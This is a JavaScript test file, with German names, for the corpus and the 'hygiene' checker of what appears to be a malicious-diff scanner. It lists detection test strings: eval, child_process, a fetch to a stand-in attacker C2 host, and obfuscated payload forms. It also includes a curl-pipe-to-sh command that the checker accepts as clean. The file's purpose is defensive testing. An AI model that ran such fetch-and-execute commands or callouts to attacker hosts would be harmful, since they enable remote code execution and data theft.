import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, writeFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { ladeKorpus, ladeFall } from '../lib/selbsttest/korpus.mjs';
import { pruefeHygiene, pruefeFallHygiene } from '../lib/selbsttest/hygiene.mjs';

test('Korpus: lädt, hat mindestens 30 böse und 50 gute Fälle, Kennungen eindeutig', async () => {
  const faelle = await ladeKorpus();
  const boese = faelle.filter((f) => f.art === 'boese');
  const gute = faelle.filter((f) => f.art === 'gut');
  assert.ok(boese.length >= 30, `böse: ${boese.length}`);
  assert.ok(gute.length >= 50, `gut: ${gute.length}`);
  assert.equal(new Set(faelle.map((f) => f.kennung)).size, faelle.length);
  for (const f of boese) assert.ok(f.erwartet.length, f.kennung);
  for (const f of gute) assert.deepEqual(f.erwartet, [], f.kennung);
});

test('Korpus: vorhandene Test-Fixtures werden per Verweis einbezogen, nicht kopiert', async () => {
  const faelle = await ladeKorpus();
  const mitFixture = faelle.filter((f) => f.kennung.startsWith('fixture-'));
  assert.ok(mitFixture.length >= 2);
  for (const f of mitFixture) assert.ok(f.dateien[0].patch.split('\n').length > 3, f.kennung);
});

test('Korpus-Hygiene: kein Fall enthält Ausführung, fremde Adressen oder Base64-/Escape-Code', async () => {
  const faelle = await ladeKorpus();
  const verstoesse = faelle.flatMap((f) => pruefeFallHygiene(f));
  assert.deepEqual(verstoesse, []);
});

test('Hygiene-Prüfung erkennt, was im Korpus nichts verloren hat', () => {
  // Testwerte zur Laufzeit zusammengesetzt, damit auch diese Datei sauber bleibt.
  const aufruf = (n, arg) => `${n}(${arg})`;
  const schlecht = [
    [aufruf('ev' + 'al', 'x'), 'eval('],
    [aufruf('Func' + 'tion', '"return 1"'), 'Function('],
    [`require('child_` + `process')`, 'child_process'],
    ['fetch("https://' + 'c2-host.beispiel-angreifer.ru/x")', 'Adresse'],
    ['const h = "' + 'loader.vercel' + '.app";', 'Domain'],
    ['verbinde(' + "'" + '8.8' + '.4.4' + "')", 'IP-Adresse'],
    ["const p = '" + Buffer.from('console.log("das ist lesbarer text und gerade kein platzhalter")').toString('base64') + "';", 'Base64'],
    ["const e = '" + [...'abcdefghij'].map((c) => '\\x' + c.charCodeAt(0).toString(16)).join('') + "';", 'Escapes'],
    ['String.fromCharCode(' + [104, 105, 106, 107, 108, 109, 110, 111].join(',') + ')', 'fromCharCode'],
  ];
  for (const [text, art] of schlecht) assert.ok(pruefeHygiene(text).length > 0, `${art}: ${text}`);
  const sauber = [
    "eval('platzhalter'); Function(\"platzhalter\");",
    'curl -s https://pakete.example/setup.sh | sh',
    'http://localhost:3000 und https://www.example.com/x und https://host.test',
    'Server 127.0.0.1, Doku 192.0.2.10',
    "const leer = '" + 'A'.repeat(500) + "';",
    'sha512-' + Buffer.from(Array.from({ length: 64 }, (_, i) => (i * 37 + 11) % 256)).toString('base64'),
    '<svg xmlns="http://www.w3.org/2000/svg"></svg>',
    'window.app = 1; console.info("x"); style.top = 0;',
  ];
  for (const text of sauber) assert.deepEqual(pruefeHygiene(text), [], text);
});

async function tempFall(art, kennung, fall, dateien = {}) {
  const wurzel = await mkdtemp(path.join(tmpdir(), 'schleuse-korpus-'));
  const ordner = path.join(wurzel, art, kennung);
  await mkdir(ordner, { recursive: true });
  await writeFile(path.join(ordner, 'fall.json'), JSON.stringify(fall));
  for (const [n, t] of Object.entries(dateien)) await writeFile(path.join(ordner, n), t);
  return { wurzel, ordner };
}

test('Korpus-Laden ist streng: Formfehler brechen ab statt still wegzufallen', async () => {
  const gut = { kennung: 'probe', art: 'gut', warum: 'ein ganz normaler Fall', dateien: [{ pfad: 'a.js', diff: '1.diff' }] };
  const diff = { '1.diff': '@@ -1,0 +1,1 @@\n+const a = 1;\n' };
  const faelle = [
    [{ ...gut, kennung: 'anders' }, /passt nicht zum Ordner/],
    [{ ...gut, art: 'boese' }, /passt nicht zum Ordner/],
    [{ ...gut, erwartet: [{ regel: 'anhang/fuellung' }] }, /erwartet keine Regel/],
    [{ ...gut, dateien: [{ pfad: 'a.js', diff: '../../x.diff' }] }, /ungültiger Dateiname/],
    [{ ...gut, dateien: [{ pfad: 'a.js', fixture: '../package.json' }] }, /ungültiger Dateiname/],
    [{ ...gut, dateien: [{ pfad: 'a.js', diff: '1.diff', hex: '00' }] }, /genau eins/],
    [{ ...gut, warum: 'kurz' }, /warum/],
    [{ ...gut, bekannt: [{ art: 'fehlalarm', regel: 'x/y' }] }, /grund/],
  ];
  for (const [fall, muster] of faelle) {
    const { wurzel, ordner } = await tempFall(fall.art === 'boese' ? 'gut' : 'gut', 'probe', fall, diff);
    try { await assert.rejects(ladeFall(ordner, 'gut'), muster, JSON.stringify(fall)); } finally { await rm(wurzel, { recursive: true, force: true }); }
  }
  const boese = { kennung: 'probe', art: 'boese', warum: 'böser Fall ohne Erwartung', erwartet: [], dateien: gut.dateien };
  const { wurzel, ordner } = await tempFall('boese', 'probe', boese, diff);
  try { await assert.rejects(ladeFall(ordner, 'boese'), /mindestens eine erwartete Regel/); } finally { await rm(wurzel, { recursive: true, force: true }); }
});

test('Korpus-Laden: Diff, Hex und Text werden API-förmig, ohneInhalt hat keinen Patch', async () => {
  const fall = { kennung: 'probe', art: 'gut', warum: 'Formen der Dateiangabe', dateien: [
    { pfad: 'a.js', diff: '1.diff' },
    { pfad: 'b.woff2', status: 'added', hex: '774f4632' },
    { pfad: 'c.js', status: 'added', inhalt: 'c.txt' },
    { pfad: 'd.js', ohneInhalt: true, additions: 7 },
  ] };
  const { wurzel, ordner } = await tempFall('gut', 'probe', fall, { '1.diff': '@@ -1,1 +1,2 @@\n x\n+y\n-z\n', 'c.txt': 'eins\nzwei' });
  try {
    const f = await ladeFall(ordner, 'gut');
    const [a, b, c, d] = f.dateien;
    assert.equal(a.additions, 1); assert.equal(a.deletions, 1); assert.ok(a.patch.startsWith('@@'));
    assert.equal(b.patch, undefined); assert.equal(b._bytes.toString('hex'), '774f4632');
    assert.ok(c.patch.includes('+zwei'));
    assert.equal(d.patch, undefined); assert.equal(d.additions, 7); assert.equal(d._bytes, undefined);
  } finally { await rm(wurzel, { recursive: true, force: true }); }
});
